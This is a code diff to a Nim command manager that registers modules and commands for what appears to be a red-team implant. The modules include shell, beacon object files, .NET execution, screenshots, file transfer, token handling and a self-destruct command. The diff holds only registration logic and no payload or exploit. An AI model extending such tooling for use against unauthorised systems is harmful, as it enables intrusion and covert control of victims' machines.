@@ -17,6 +17,18 @@ proc registerModule(module: Module) {.discardable.} =
         manager.commandsByType[cmd.commandType] = cmd
         manager.commandsByName[cmd.name] = cmd
 
+proc registerCommands(commands: seq[Command]) {.discardable.} = 
+    for cmd in commands: 
+        manager.commandsByType[cmd.commandType] = cmd
+        manager.commandsByName[cmd.name] = cmd 
+
+#[
+    Modules/commands
+]# 
+
+import exit
+registerCommands(exit.commands)
+
 # Import all modules
 when (MODULES == cast[uint32](MODULE_ALL)):
     import 
@@ -27,7 +39,8 @@ when (MODULES == cast[uint32](MODULE_ALL)):
         bof,
         dotnet,
         screenshot,
-        situationalAwareness
+        systeminfo,
+        token
     registerModule(sleep.module)
     registerModule(shell.module)
     registerModule(bof.module)
@@ -35,7 +48,8 @@ when (MODULES == cast[uint32](MODULE_ALL)):
     registerModule(filesystem.module)
     registerModule(filetransfer.module)
     registerModule(screenshot.module)
-    registerModule(situationalAwareness.module)
+    registerModule(systeminfo.module)
+    registerModule(token.module)
 
 # Import modules individually 
 when ((MODULES and cast[uint32](MODULE_SLEEP)) == cast[uint32](MODULE_SLEEP)):
@@ -60,8 +74,11 @@ when ((MODULES and cast[uint32](MODULE_SCREENSHOT)) == cast[uint32](MODULE_SCREE
     import screenshot
     registerModule(screenshot.module)
 when ((MODULES and cast[uint32](MODULE_SITUATIONAL_AWARENESS)) == cast[uint32](MODULE_SITUATIONAL_AWARENESS)):
-    import situationalAwareness
-    registerModule(situationalAwareness.module)
+    import systeminfo
+    registerModule(systeminfo.module)
+when ((MODULES and cast[uint32](MODULE_TOKEN)) == cast[uint32](MODULE_TOKEN)):
+    import token
+    registerModule(token.module)
 
 proc getCommandByType*(cmdType: CommandType): Command = 
     return manager.commandsByType[cmdType]
@@ -82,3 +99,17 @@ proc getModules*(modules: uint32 = 0): seq[Module] =
         for m in manager.modules: 
             if (modules and cast[uint32](m.moduleType)) == cast[uint32](m.moduleType): 
                 result.add(m)
+
+proc getCommands*(modules: uint32 = 0): seq[Command] = 
+    # House-keeping 
+    result.add(manager.commandsByType[CMD_EXIT])
+    result.add(manager.commandsByType[CMD_SELF_DESTRUCT])
+
+    # Modules
+    if modules == 0:
+        for m in manager.modules: 
+            result.add(m.commands)
+    else: 
+        for m in manager.modules: 
+            if (modules and cast[uint32](m.moduleType)) == cast[uint32](m.moduleType): 
+                result.add(m.commands)
